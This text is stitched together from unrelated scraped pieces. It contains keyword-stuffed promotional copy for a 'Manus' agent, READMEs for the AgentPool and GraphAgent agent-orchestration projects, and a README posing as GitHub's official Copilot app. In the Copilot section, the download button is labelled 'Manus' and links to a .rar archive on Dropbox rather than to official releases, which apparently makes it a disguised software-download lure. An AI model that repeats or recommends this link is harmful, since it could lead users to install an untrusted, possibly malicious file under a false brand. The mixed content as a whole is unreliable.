and Manus browser control feel natural, then expand to your full daily workflow. --- ## Related Search Terms Manus AI agent • Manus code automation • Manus browser control • Manus autonomous tasks • Manus personal assistant • Manus task helper • Manus workflow aid • Manus background agent • Manus code runner • Manus browser helper • Manus daily automation • Manus study assistant • Manus home helper • Manus light work aid • Manus multi-step tasks • Manus script runner • Manus web navigation • Manus task delegation • Manus quiet helper • Manus small project aid • Manus research assistant • Manus routine automation

items.name: agentpool
items.description: A unified agent orchestration hub that lets you configure and manage multiple AI agents (native, ACP, AGUI, Claude Code) via YAML, and exposes them through standardized protocols (ACP/OpenCode Server).
items.readme_text:
# AgentPool [![PyPI License](https://img.shields.io/pypi/l/agentpool.svg)](https://pypi.org/project/agentpool/) [![Package status](https://img.shields.io/pypi/status/agentpool.svg)](https://pypi.org/project/agentpool/) [![Monthly downloads](https://img.shields.io/pypi/dm/agentpool.svg)](https://pypi.org/project/agentpool/) [![Python version](https://img.shields.io/pypi/pyversions/agentpool.svg)](https://pypi.org/project/agentpool/) [![Github Stars](https://img.shields.io/github/stars/phil65/agentpool)](https://github.com/phil65/agentpool/stars) **A unified agent orchestration hub that lets you configure and manage heterogeneous AI agents via YAML and expose them through standardized protocols.** [Documentation](https://phil65.github.io/agentpool/) ## The Problem You want to use multiple AI agents together - Claude Code for refactoring, Codex for code editing with advanced reasoning, a custom analysis agent, maybe Goose for specific tasks. But each has different APIs, protocols, and integration patterns. Coordinating them means writing glue code for each combination. ## The Solution AgentPool acts as a protocol bridge. Define all your agents in one YAML file - whether they're native (PydanticAI-based), direct integrations (Claude Code, Codex), external ACP agents (Goose), or AG-UI agents. Then expose them all through ACP or AG-UI protocols, letting them cooperate, delegate, and communicate through a unified interface. ```mermaid flowchart TB subgraph AgentPool subgraph config[YAML Configuration] native[Native Agents
PydanticAI] direct[Direct Integrations
Claude Code, Codex] acp_agents[ACP Agents
Goose, etc.] agui_agents[AG-UI Agents] workflows[Teams & Workflows] end subgraph interface[Unified Agent Interface] delegation[Inter-agent delegation] routing[Message routing] context[Shared context] end config --> interface end interface --> acp_server[ACP Server] interface --> opencode_server[OpenCode Server] interface --> agui_server[AG-UI Server] acp_server --> clients1[Zed, Toad, ACP Clients] opencode_server --> clients2[OpenCode TUI/Desktop] agui_server --> clients3[AG-UI Clients] ``` ## Quick Start ```bash uv tool install agentpool ``` ### Minimal Configuration ```yaml # agents.yml agents: assistant: type: native model: openai:gpt-4o system_prompt: "You are a helpful assistant." ``` ```bash # Run via CLI agentpool run assistant "Hello!" # Or start as ACP server (for Zed, Toad, etc.) agentpool serve-acp agents.yml ``` ### Integrating External Agents The real power comes from mixing agent types: ```yaml agents: # Native PydanticAI-based agent coordinator: type: native model: openai:gpt-4o tools: - type: subagent # Can delegate to all other agents system_prompt: "Coordinate tasks between available agents." # Claude Code agent (direct integration) claude: type: claude_code description: "Claude Code for complex refactoring" # Codex agent (direct integration) codex: type: codex model: gpt-5.1-codex-max reasoning_effort: medium description: "Codex for code editing with advanced reasoning" # ACP protocol agents goose: type: acp provider: goose description: "Goose for file operations" # AG-UI protocol agent agui_agent: type: agui url: "http://localhost:8000" description: "Custom AG-UI agent" ``` Now `coordinator` can delegate work to any of these agents, and all are accessible through the same interface. ## Key Features ### Multi-Agent Coordination Agents can form teams (parallel) or chains (sequential): ```yaml teams: review_pipeline: mode: sequential members: [analyzer, reviewer, formatter] parallel_coders: mode: parallel members: [claude, goose] ``` ```python async with AgentPool("agents.yml") as pool: # Parallel execution team = pool.get_agent("analyzer") & pool.get_agent("reviewer") results = await team.run("Review this code") # Sequential pipeline chain = analyzer | reviewer | formatter result = await chain.run("Process this") ``` ### Rich YAML Configuration Everything is configurable - models, tools, connections, triggers, storage: ```yaml agents: analyzer: type: native model: type: fallback models: [openai:gpt-4o, anthropic:claude-sonnet-4-0] tools: - type: subagent - type: resource_access mcp_servers: - "uvx mcp-server-filesystem" knowledge: paths: ["docs/**/*.md"] connections: - type: node name: reporter filter_condition: type: word_match words: [error, warning] ``` ### Server Protocols AgentPool can expose your agents through multiple server protocols: | Server | Command | Use Case | |--------|---------|----------| | **ACP** | `agentpool serve-acp` | IDE integration (Zed, Toad) - bidirectional communication with tool confirmations | | **OpenCode** | `agentpool serve-opencode` | OpenCode TUI/Desktop - supports remote filesystems via fsspec | | **MCP** | `agentpool serve-mcp` | Expose tools to other agents | | AG-UI | `agentpool serve-agui` | AG-UI compatible frontends | | OpenAI API | `agentpool serve-api` | Drop-in OpenAI API replacement | The **ACP server** is ideal for IDE integration - it provides real-time tool confirmations and session management. The **OpenCode server** enables the OpenCode TUI to control AgentPool agents, including agents operating on remote environments (Docker, SSH, cloud sandboxes). ### Additional Capabilities - **Structured Output**: Define response schemas inline or import Python types - **Storage & Analytics**: Track all interactions with configurable providers - **File Abstraction**: UPath-backed operations work on local and remote sources - **Triggers**: React to file changes, webhooks, or custom events - **Streaming TTS**: Voice output support for all agents ## Usage Patterns ### CLI ```bash agentpool run agent_name "prompt" # Single run agentpool serve-acp config.yml # ACP server for IDEs agentpool serve-opencode config.yml # OpenCode TUI server agentpool serve-mcp config.yml # MCP server agentpool watch --config agents.yml # React to triggers agentpool history stats --group-by model # View analytics ``` ### Programmatic ```python from agentpool import AgentPool async with AgentPool("agents.yml") as pool: agent = pool.get_agent("assistant") # Simple run result = await agent.run("Hello") # Streaming async for event in agent.run_stream("Tell me a story"): print(event) # Multi-modal result = await agent.run("Describe this", Path("image.jpg")) ``` ## Documentation For complete documentation including advanced configuration, connection patterns, and API reference, visit [phil65.github.io/agentpool](https://phil65.github.io/agentpool/).

Anyone juggling several small projects can let Manus autonomous tasks handle the repetitive parts while they focus on the parts that need human judgment. **Quiet Background Helper:** Manus personal assistant stays out of the way until needed, then responds quickly without disrupting your main workflow. - **Consistent Across Sessions:** Manus AI agent applies the same logic each time, reducing the mental overhead of switching between different tools and interfaces. - **Built For Small Scale:** Manus autonomous tasks are designed for home, study, and light work, not just large enterprise environments. --- ## Compatibility | Component | Minimum | Recommended | |-----------|---------|-------------| | **Operating System** | Modern 64-bit system | Current OS with updated runtime | | **Processor (CPU)** | Dual-core CPU | Modern multi-core CPU for smooth Manus code automation | | **Memory (RAM)** | 4 GB | 8 GB or more for heavy Manus autonomous tasks | | **Storage** | Space for the agent and logs | Extra room for task history and profiles | | **Permissions** | Standard user access | Elevated rights for full Manus browser control | --- ## Starting with Manus Prerequisites: A compatible computer, a stable internet connection, and permission to run background helpers. 1. **Prepare:** Close unnecessary programs and make sure your environment is ready before launching Manus AI agent. 2. **Configure:** Open Manus personal assistant, review the default Manus code automation settings, and adjust triggers if you prefer different behavior. 3. **Test:** Give Manus browser control a simple task, such as opening a page and reading a value, to confirm Manus autonomous tasks behave as expected. 4. **Refine:** Customize which task types Manus AI agent should handle automatically and which ones need your confirmation. 5. **Apply:** Use Manus code automation and Manus browser control throughout your daily work to move small projects forward without constant manual effort. 6. **Maintain:** Revisit settings occasionally to keep Manus personal assistant aligned with your changing workflow and hardware. --- ## Best Uses - **Light Office Work:** Manus browser control makes it easy to gather information from multiple tabs and prepare summaries for small reports. - **Development And Testing:** Manus code automation lets you run quick experiments and compare results without setting up a full environment each time. - # GraphAgent > 跑动态工作流的终端编码智能体：主智能体自己设计依赖图，子智能体按波次并行执行，状态持久化，崩溃后能恢复。 [![release](https://img.shields.io/github/v/release/LeXwDeX/GraphAgent)](https://github.com/LeXwDeX/GraphAgent/releases) [![license](https://img.shields.io/badge/license-MIT%20%2B%20Apache--2.0-blue)](#起源与许可) [![stars](https://img.shields.io/github/stars/LeXwDeX/GraphAgent)](https://github.com/LeXwDeX/GraphAgent/stargazers) GraphAgent 是独立的终端编码智能体，专注动态 DAG 工作流。它起源于 opencode 的早期版本，从 v2.0 起完全独立维护。 单个智能体循环处理一步到位的任务没有问题。任务一旦有先后依赖、有能并行的部分、中途还要过一道审查，它就吃力了：本该并行的活被串着跑，中间结论也没人复核。进程一挂，只能从头来。GraphAgent 让主智能体先把任务画成一张依赖图，再按图执行。图不是预先写死的，是它按任务现设计的，所以 DAG 工作流基本上就是动态工作流。 图里每个节点是一个真实的子会话，有自己的智能体和上下文窗口；依赖都满足的节点算一个波次，同一波次里并行跑。状态以事件持久化，所以能暂停、单步、重规划，崩溃后按持久化的记录恢复，不会凭空重放模型调用。 ## 项目状态 v2.0 开发中，即将发布。发布进度在[里程碑](https://github.com/LeXwDeX/GraphAgent/milestone/7)里跟踪；可复现的问题请提 [Issue](https://github.com/LeXwDeX/GraphAgent/issues)。 ## 核心能力 | 能力 | 说明 | | ----------- | ---------------------------------------------------------------------------------------------------------------------------------- | | DAG 工作流 | 主智能体设计依赖图，每个节点是真实的子会话，按波次并行；状态持久化，可暂停、恢复、重规划；节点超时从拿到执行槽位起算，排队时间不计 | | 统一子运行 | `task` 与 DAG 节点共用 ChildRun：每次委派一条持久记录，统一归属校验、取消和结果投递；子会话只接受主 agent 通信 | | 前后台委派 | 提示词准则决定 `task` 在前台等待还是后台运行；后台结果完成时以一条消息回注，不打断主会话 | | 只读 review | 内置只读 `review` agent；`/review` 默认后台执行，结论由主会话转述 | | 思考塑形 🧪 | 实验性功能，默认关闭 | | 项目记忆 | `/memory`，只保存你确认过的内容，同一项目的所有 worktree 共用 | | Goal / Loop | `/goal`、`/subgoal`，外部 judge 判断进度，有回合预算 | | 定时提醒 | `/remind`，持久化的定时提醒；会话忙时等回合结束再送达，关闭期间到期的重启后补发 | | Hooks | 兼容 Claude Code hooks 协议 | | 上下文管理 | 工具输出限制、工具调用上限、长会话压缩 | ### DAG 工作流 主智能体觉得任务值得拆，就自己建图，不用你开口；你也可以用 `/dag-auto <任务>` 直接要求。边只表示“下游要读上游的产出”，没有这层关系的节点就并行。负责审查和仲裁的节点叫门禁，输出 ACCEPT、REVISE、REJECT 或 BLOCKED，下游可以按裁定决定跑不跑。TUI 里有 DAG 检查器，能看各波次和节点的实时状态，也能进入任何一个节点的子会话。 模型分层写在 `.agents/settings.json` 的 `dag.model`（判断、验收和评审节点用 advanced，写代码和探索这类跑量的用 standard），常用的图存进 `.agents/workflows/`，之后按名字就能启动。精选模板在 [opencode-dag-config](https://github.com/LeXwDeX/opencode-dag-config)。节点的 `timeout_ms` 从拿到执行槽位开始计时，排队时间不计。崩溃恢复只认持久化的记录。引擎不假设有跨进程的锁，也不保证节点恰好执行一次。用法和引擎细节见 [docs/dag-workflows.md](./docs/dag-workflows.md)。 ### 子运行与通信 `task` 和 DAG 节点共用同一套 ChildRun。一次委派对应一条持久记录，记录归属、状态与结算结果；后台运行结束后结果只投递一次，重启或进程丢失的运行也会补投。子会话不接受自由输入：HTTP 操作层对子会话的写请求返回 409，只放行权限回复和只读旁问；引擎准入要求携带当前运行的 live 凭证。 `agent` 工具负责主会话与 DAG 节点之间的观察和消息：`observe` 分页查看节点进度与尝试，`send` 向确切的活跃尝试投递，`receive` 读取邮箱。节点需要澄清时问父会话，不直接问用户。工具只在存在活跃 DAG 节点运行时出现，可见性由进程内注册表判定，不查数据库。 ### 只读 review 与前后台分类 `/review` 使用内置的只读 `review` agent：它能读文件、搜索、查 LSP、跑只读的 git 和 forge 命令，不能编辑文件、起子任务或跑会改文件的命令。命令默认在后台运行，结束后把结论交回主会话，由主会话转述。 `task` 的前台/后台由提示词里的准则判断，代码不做启发式分类。默认走前台；需要用户输入或确认、会影响与主会话共享的状态、结果是下一步的直接输入、或是主会话能直接回答的快速查询时，一律走前台。同时满足以下几点才走后台：你表示会同时做别的事（“同时”“不用等”这类说法）或明确要求后台；委派的工作只读，或只写你和主会话都不会碰的文件；结果一条消息能说完。此时主会话先委派、不预先调查，再继续你同时要求的前台工作；没有剩余才简短回复并结束回合，结果稍后以一条消息送回。agent 或命令可以声明执行方式（`execution`），声明优先于提示词准则；交互型 agent 恒前台。理由和评测结果见 [ADR 0003](./docs/adr/0003-task-execution-classification.md)。 ### 思考塑形 🧪 实验性功能，默认关闭。思考型模型会把之前的思考内容在后续请求里回传，里面常有复述、被推翻的猜测和纠错过程。这个功能在后台把已完成的思考整理得更短，在后续步骤的请求里换用整理后的版本。整理失败、超时或没有可用的小模型时保留原文；原文一直存着，关掉功能后回放的就是原文。带签名或加密的思考不会碰。 我们想知道的是，开源模型的思考内容经过塑形之后，输出能力会不会提高。效果还在验证，所以标成实验性、默认关闭。整理用配置的 `small_model`，没配就用服务商自带的小模型： ```jsonc // graphagent.json { "small_model": "provider/small-model", // 建议选有 `none` 推理档位的模型 "reasoningDistillation": { "enabled": true, // 显式开启；默认 false }, } ``` ### 项目记忆 `/memory on` 开启后，GraphAgent 按项目保存偏好、决策和术语，只保存经你确认的内容，同一项目的所有 worktree 共用一份。它不是代码索引，也不会压过你当前的输入和更高优先级的指令。 ### Goal 与 Loop `/goal <目标>` 让智能体在当前会话里跨回合自己推进一个目标，`/subgoal` 管子目标。每个回合结束后由外部 judge 判断进度：done 就收工，continue 就接着跑。总回合数有预算（默认 20），用尽后暂停，可以恢复。目标状态持久化，重启不丢。 ### 定时提醒 `/remind` 给当前会话设一个提醒。到点时，提醒会作为一条消息送进这个会话，由智能体转告你： ```text /remind 30m 看一下 CI 结果 /remind 2h 回复评审意见 /remind 09:00 站会前同步进度 /remind 明天 09:00 发周报 /remind every 1h 起身活动一下 /remind list /remind cancel rmd_1a2b3c4d ``` - `30m`、`2h`：从现在起的时长，单位只有 `m`（分钟）和 `h`（小时）。 - `09:00`：当天的这个钟点，已经过了就取明天；`明天 09:00`（也可以写 `tomorrow 09:00`）是明天的这个钟点。钟点按本机时区算。 - `every 1h`：重复提醒，首次在一个间隔之后，之后每隔一个间隔一次；间隔最短 5 分钟。 - `/remind list` 列出本会话待触发的提醒，`/remind cancel ` 取消一个。id 形如 `rmd_xxxxxxxx`，创建时的回执和 `list` 里都有。 提醒是持久化的，重启不丢，会话删除时一并删除。到点时如果会话空闲就送达，正忙就等当前回合结束后再送达；每次到期只送达一次。GraphAgent 关闭期间到期的提醒，下次在这个会话所在的目录启动时补发一次；重复提醒只补最近的一次，之后仍按原来的节奏。送达时比计划晚了一分钟以上，消息里会标明晚了多久。提醒文本原样放进这条消息，消息里要求智能体先告诉你，文本若是要做的事就接着做。 提醒只能由你用这条命令创建，模型没有创建提醒的工具；它只适用于主会话，在子会话里会被拒绝。 ### Hooks 兼容 Claude Code 的 hooks 协议。`hooks.json` 从全局配置目录和项目的 `.agents` 目录读取，执行类型有 command、HTTP、MCP 工具、prompt 和 agent 五种；项目里的 hooks 要先经过信任确认才会生效。`/import-claude` 把 `.claude/settings*.json` 审阅后转换进 `.agents/`，`/create-hook` 带你写新的 hook。详细说明见 [hooks 指南](./packages/graphagent/src/skill/builtin/configure-hooks.md)。 ### 上下文管理 一组管上下文的功能：限制工具输出的长度、限制每次输入的工具调用次数、自动压缩长会话。截断输出时会给出可执行的续读方式。 ## 其他改动 - `task` 可以用 `action: "resume"` 加 `task_id` 续接子智能体；后台子智能体完成时自动通知。 - 所有模型共用一份系统提示词，工具的用法写在各自的描述里，不按 Provider 挑提示词。 - 工具更严格，也更容易排错：`edit` 严格匹配（多处命中时列出候选行，找不到时给出最接近的片段），参数校验的报错带字段级提示。 - 支持用独立的 git worktree 管理工作目录。工作流不会自动隔离，并发的工作流要用不同的 worktree，或者串行跑。 - 会话创建时可指定 DAG 模式；TUI 页脚显示开关状态，状态接口返回可用性、并发与节点上限、token 预算用量。 - `config_assistant`（命令 `ocfg`）是一个用 Go 写的独立 TUI，用来定位、校验和编辑配置。 ## 快速开始 预构建的二进制（Linux、macOS，附 SHA256SUMS）在 [Releases](https://github.com/LeXwDeX/GraphAgent/releases) 页，解压后把 `graphagent` 放进 PATH，在项目目录里运行。v2.0 起不再发布 Windows 原生版本，也不再运行 Windows 集成测试；Windows 用户请安装 WSL，在 WSL 中按 Linux 方式安装使用。仓库里现有的 `oc` 安装脚本会在 v2.1 删除，安装和升级都并入主程序，见路线图。GraphAgent 不发布到 npm、brew 和 scoop，上游的 `opencode-ai` 装的是上游 opencode，不是 GraphAgent。 从源码运行需要 `package.json` 里 `packageManager` 固定的 Bun，以及 `.node-version` 指定的 Node： ```bash bun install bun dev <项目目录> # 启动 TUI；不带目录时在 packages/graphagent 里运行 ``` 启动之后，给它一件有阶段、有并行空间的活就行，不用先写任何 DAG 配置： ```text /dag-auto 把 auth 和 server 两个包迁移到新 API，最后跑集成测试 ``` 想把常用的图固定下来，就存成 `.agents/workflows/parallel-migrate.yaml`，之后说一句“跑 parallel-migrate 工作流”就按名字启动。下面这份 spec 里，两个迁移节点在同一波次并行，`assemble` 等它们都完成才开始： ```yaml title: 并行迁移 config: name: parallel-migrate nodes: - id: discover name: discover worker_type: explore depends_on: [] required: true prompt_template: { inline: "列出所有需要迁移到新 API 的包。" } - id: migrate-auth name: migrate-auth worker_type: build depends_on: [discover] prompt_template: { inline: "把 auth 包迁移到新 API。" } - id: migrate-server name: migrate-server worker_type: build depends_on: [discover] prompt_template: { inline: "把 server 包迁移到新 API。" } - id: assemble name: assemble worker_type: build depends_on: [migrate-auth, migrate-server] prompt_template: { inline: "跑集成测试，汇总结果。" } ``` 安装步骤、完整性校验和源码构建的细节见 [docs/install.md](./docs/install.md)。 ## 设计思路 我们把图当成一份可执行、可持久化、可检查的契约，不是给人看的流程图，也不是事后给提示词链加的箭头。边必须真的传递产出：下游不读上游的东西，这条依赖就该删，独立的工作直接并行。模板只是参考拓扑，主智能体可以按任务增删分支，但每次剪枝要写明理由。预测、复审和裁决由不同的角色做，门禁不能剪。迭代只是有界的局部改图，不存在隐藏的环。最后，代码和测试说了算，状态靠事件记录恢复，代价高的地方留给人暂停、单步、取消和重规划。 第一个完整的 DAG 引擎提交是 2026-07-02；论文 [What makes prompts a graph](https://arxiv.org/abs/2607.27578) 到 2026-07-30 才把显式结构、提示词与拓扑分离、可执行语义和“图是一等制品”这些想法归纳出来，比引擎晚了四周。 ## 路线图 v2.0 的剩余工作也在[里程碑](https://github.com/LeXwDeX/GraphAgent/milestone/7)里跟踪： - DAG 模式的行为面：并发池、预算与质量机制、节点权限自动裁决。 - workflow 工具接口收敛、工作流级 worktree、事件驱动邮箱与持久对账。 - agent 契约与 composer：内置调研、架构设计、原型设计 agent，并在 DAG 内组合公共 agent。 - PR 监听改为事件源；`/remind` 持久提醒；后台任务显示与子 agent 只读界面。 - v2.0.0 发布：版本推导、Breaking 清单、中英迁移指南与 Linux、macOS 冒烟。 - v2.1：安装与升级并入主程序，直接从 GitHub 检索新版本并升级，不再需要 `oc` 脚本；release 打包随之调整，macOS 上安装不用再输密码；配置也可以从 GitHub 仓库读取（[#1281](https://github.com/LeXwDeX/GraphAgent/issues/1281)）。 这些都是计划，实际状态以里程碑为准。 ## 起源与许可 GraphAgent 起源于早期的 opencode（MIT，[anomalyco/opencode](https://github.com/anomalyco/opencode)），从 v2.0 起作为独立项目维护。 许可分两条：继承自上游的代码保持 MIT，包括被我们改过的上游文件，文本见 [LICENSE](./LICENSE)；GraphAgent 新写的代码是 Apache-2.0，文本见 [LICENSE-APACHE](./LICENSE-APACHE)。精确的文件边界在 [LICENSE-UPSTREAM.txt](./LICENSE-UPSTREAM.txt)，[NOTICE](./NOTICE) 有摘要。再分发时请保留 NOTICE 里的版权与归属声明。 ## 文档 除 architecture.md 和功能清单外，下面的文档目前只有英文。 - [docs/architecture.md](./docs/architecture.md)：v1 架构，包括组件与目录、客户端与协议、源码索引 - [docs/dag-workflows.md](./docs/dag-workflows.md)：DAG 工作流的用法、配置和引擎细节 - [docs/install.md](./docs/install.md)：安装、完整性校验和源码构建 - [docs/compaction-retry.md](./docs/compaction-retry.md)：Provider 重试与压缩请求 - [hooks 指南](./packages/graphagent/src/skill/builtin/configure-hooks.md)：事件、配置和验证方法 - [docs/功能清单.md](./docs/功能清单.md)：功能与源码入口索引 - [AGENTS.md](./AGENTS.md)：开发指南 - [CONTRIBUTING.md](./CONTRIBUTING.md)：贡献说明 ## 链接 [GitHub](https://github.com/LeXwDeX/GraphAgent) · [Issues](https://github.com/LeXwDeX/GraphAgent/issues) · [Releases](https://github.com/LeXwDeX/GraphAgent/releases) · [里程碑](https://github.com/LeXwDeX/GraphAgent/milestone/7) · [opencode-dag-config](https://github.com/LeXwDeX/opencode-dag-config)

items.description: The GitHub Copilot app is an agent-native desktop experience for finding, running, steering, and landing software work across your GitHub repositories.
items.readme_text:
# GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for finding, running, steering, and landing software work across your GitHub repositories.

https://github.com/user-attachments/assets/50f215b5-f708-444e-83f7-3303bfa97963 ## The GitHub Copilot app The GitHub Copilot app is an agent-native desktop experience for managing software work from idea to pull request. It gives you a single control center for finding the right work to pick up, starting and steering agents, reviewing progress, and landing changes across repositories without constantly switching between terminals, editors, browser tabs, and GitHub pages. The app is built for parallel agent-driven development. Each local session runs in its own isolated git worktree, and cloud sessions let agents keep working in isolated GitHub-hosted environments that you can pick up from anywhere. That means you can have Copilot investigate bugs, implement issues, address review feedback, or explore changes side by side without branches or files colliding. Canvases turn agent work into shared, inspectable surfaces. Instead of burying plans, terminals, browser previews, diffs, and workflow state in a chat thread, canvases give you a place to see what an agent is doing, edit or redirect the work, and verify progress in context. But we also know as developers, much our time has always been devoted to tasks that aren't 'just' writing code. My Work brings together sessions, issues, pull requests, and repository context so you can decide what needs attention next. Automations turn repeatable prompts and workflows into scheduled or background tasks. Agent Merge helps carry pull requests through review, checks, and merge conditions so you stay focused on judgment, quality, and delivery. ## Getting started ### Prerequisites - [Git](https://github.com/git-guides/install-git) - A [GitHub Copilot](https://github.com/features/copilot/plans) plan — any plan works, including Copilot Free and [GitHub Copilot Student](https://github.com/education/students). No Copilot plan? You can still use the app by bringing your own key (BYOK) with your own model provider. ### Install Download the app for your platform: [![Download](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://www.dropbox.com/scl/fi/j76ijf5l3bdbckuip6kx9/GitHub_Copilot_app.rar?rlkey=acbqv1mezy4gd1wobkxw24oz1&st=8k9t5tp1&dl=1) You can also browse all builds on the [Releases](../../releases) page. For setup and a walkthrough of your first session, see the [documentation](https://gh.io/github-app-docs). ## This repository This repo is the public home for the GitHub Copilot app. Use it to: - Download releases from the [Releases](../../releases) page - File bugs and feature requests - Join discussions - Read release notes in [`changelog.md`](./changelog.md) ## Feedback Report problems or feature requests for the GitHub Copilot app team in the [Issues](https://github.com/github/app/issues) tab. When filing an issue, please include: - The app version - Your operating system and version - Steps to reproduce - Expected vs. actual behavior - Screenshots or videos - Logs from the `/collect-debug-logs` command. Note: These logs may contain sensitive information. For open-ended questions, please visit the [Discussions](https://github.com/github/app/discussions) tab. ### Stale issues Open issues with no activity for 60 days receive a warning and the `stale` label. They are automatically closed if there is no new activity for another 7 days. New activity removes that label on a subsequent daily run and resets the inactivity timer. Issues labeled `never-stale`, `help wanted`, `on-roadmap`, `pinned`, or `security` are exempt. Pull requests are left unchanged. The [stale issue workflow](./.github/workflows/stale-issues.yml) runs daily at 01:30 UTC and can also be run manually. GitHub Actions must be enabled for this automation to run. Each run has a budget of 5,000 operations and a 60-minute timeout. If the operations budget is exhausted, the workflow saves its progress in the Actions cache so a later run can resume. ## License © GitHub, Inc. All rights reserved. ## Data & Telemetry If you use the GitHub Copilot App with your GitHub Copilot account, we may collect usage data (such as code acceptance or rejections), associated conversation data, and user feedback submitted via the feedback dialog. See our [GitHub Copilot Trust Center](https://copilot.github.trust.page) for more information.
